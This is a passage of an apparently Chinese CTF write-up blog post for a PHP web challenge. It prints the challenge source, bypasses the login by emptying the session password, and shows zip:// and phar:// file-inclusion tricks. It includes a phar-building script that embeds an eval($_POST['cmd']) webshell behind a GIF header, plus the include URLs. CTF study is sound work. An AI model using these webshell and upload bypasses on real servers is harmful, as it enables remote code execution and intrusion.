+<span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>没有账号?<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;signup&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>不给注册<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
+<span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-comment">&lt;!-- JavaScript files--&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;vendor/jquery-validation/jquery.validate.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-comment">&lt;!--表单验证--&gt;</span></span>
+<span class="xml">    <span class="hljs-comment">&lt;!-- Main File--&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/front.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+<span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
+<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
+
+<span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;secret.php&quot;</span>);</span>
+<span class="php">mt_srand($secret_seed);</span>
+<span class="php">$_SESSION[<span class="hljs-string">&#x27;password&#x27;</span>] = mt_rand();</span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
+<p>secret.php</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$secret_seed = mt_rand();
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>暂时没发现什么，但是源码中有一个admin/user:</p>
+<pre><code class="hljs oxygene">&lt;form <span class="hljs-function"><span class="hljs-keyword">method</span>=&quot;<span class="hljs-title">post</span>&quot; <span class="hljs-title">action</span>=&quot;/?<span class="hljs-title">page</span>=<span class="hljs-title">admin</span>/<span class="hljs-title">user</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">validate</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">loginFrom</span>&quot;&gt;</span></code></pre>
+<p>读取源码得到：</p>
+<p>登录</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+session_start();
+$logined = <span class="hljs-literal">false</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;
+	<span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">&#x27;password&#x27;</span>] == $_SESSION[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;  <span class="hljs-comment">// No one knows my password, including myself</span>
+		$logined = <span class="hljs-literal">true</span>;
+		$_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] = $logined;
+	&#125;
+&#125;
+<span class="hljs-keyword">if</span> ($logined === <span class="hljs-literal">false</span> &amp;&amp; !<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>]) || $_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] !== <span class="hljs-literal">true</span>)&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;
+	<span class="hljs-keyword">die</span>();
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>上传文件</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>]) <span class="hljs-keyword">and</span> $_SESSION[<span class="hljs-string">&#x27;status&#x27;</span>] === <span class="hljs-literal">true</span>)&#123;
+			$tmp_file = $_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
+			$tmp_path = $_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+			<span class="hljs-keyword">if</span>(($extension = pathinfo($tmp_file)[<span class="hljs-string">&#x27;extension&#x27;</span>]) != <span class="hljs-string">&quot;&quot;</span>)&#123;
+				$allows = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);
+				<span class="hljs-keyword">if</span>(in_array($extension,$allows,<span class="hljs-literal">true</span>) <span class="hljs-keyword">and</span> in_array($_FILES[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$ext</span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;image/&#x27;</span>.$ext;&#125;,$allows),<span class="hljs-literal">true</span>))&#123;
+						$upload_name = sha1(md5(uniqid(microtime(<span class="hljs-literal">true</span>), <span class="hljs-literal">true</span>))).<span class="hljs-string">&#x27;.&#x27;</span>.$extension;
+						move_uploaded_file($tmp_path,<span class="hljs-string">&quot;assets/img/upload/&quot;</span>.$upload_name);
+						<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;
+				&#125; <span class="hljs-keyword">else</span> &#123;
+					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;
+				&#125;
+			&#125;
+		&#125;
+	  <span class="hljs-meta">?&gt;</span></code></pre>
+<p>登录里面</p>
+<pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> and <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])</code></pre>
+<p>用户名是强等于，密码要与session值相等，但在login.php里提到<code>$_SESSION['password'] = mt_rand();</code>,我们不能得到seed，当我们可以把session删掉，让passwd置空这样也可以达到相等，passwd为必须，但在前端可以删除require：</p>
+<p><img src="/2021/08/07/hate/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>登录后是前面得到源码的页面，我们可以传个🐎，但是有限制图片格式，最后会解析成图片，可以用伪协议绕过，phar或者zip都可以。</p>
+<h4 id="zip"><a class="header-anchor" href="#zip">🍭</a>zip://</h4>
+<p>写个一句话添加到压缩文件，生成一个.zip ，改个后缀， 上传，</p>
+<pre><code class="hljs awk">zip:<span class="hljs-regexp">//</span> + zip路径 + %<span class="hljs-number">23</span> + php文件名
+?page=zip:<span class="hljs-regexp">//</span>assets<span class="hljs-regexp">/img/u</span>pload/xxx.jpg%<span class="hljs-number">23</span>zip
+<span class="hljs-comment">#index.php包含的时候默认加上了php后缀</span></code></pre>
+<p>蚁剑连接</p>
+<img src="/2021/08/07/hate/2.png" srcset="/img/loading.gif" alt="2" style="zoom:67%;">
+<h4 id="phar"><a class="header-anchor" href="#phar">🍭</a>phar://</h4>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;
+    <span class="hljs-keyword">public</span> $content;
+    <span class="hljs-keyword">public</span> $pattern;
+    <span class="hljs-keyword">public</span> $suffix;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$content</span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;content = $content;
+        <span class="hljs-keyword">$this</span>-&gt;pattern = <span class="hljs-string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;suffix = <span class="hljs-string">&quot;.php&quot;</span>;
+    &#125;
+&#125;
+
+@unlink(<span class="hljs-string">&quot;zip.phar&quot;</span>);
+$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;zip.phar&quot;</span>);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub, 增加gif文件头，伪造文件类型</span>
+$o = <span class="hljs-keyword">new</span> Template(<span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);
+$phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义meta-data存入manifest</span>
+$phar-&gt;addFromString(<span class="hljs-string">&quot;test.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span>
+<span class="hljs-comment">//签名自动计算</span>
+$phar-&gt;stopBuffering();
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>读取</p>
+<pre><code class="hljs undefined">?page&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;xxx.jpg&#x2F;test</code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-15.html#toc-cb8">https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-15.html#toc-cb8</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/zip-%E8%BD%AF%E9%93%BE%E6%8E%A5/">zip 软链接</a>
+                    
+                      <a class="hover-with-bg" href="/categories/zip-%E8%BD%AF%E9%93%BE%E6%8E%A5/flask-session-%E4%BC%AA%E9%80%A0/">flask-session 伪造</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/zip/">zip://</a>
+                    
+                      <a class="hover-with-bg" href="/tags/phar/">phar://</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/08/cmd/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP无参数RCE</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/05/num/">
+                        <span class="hidden-mobile">buu（六）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
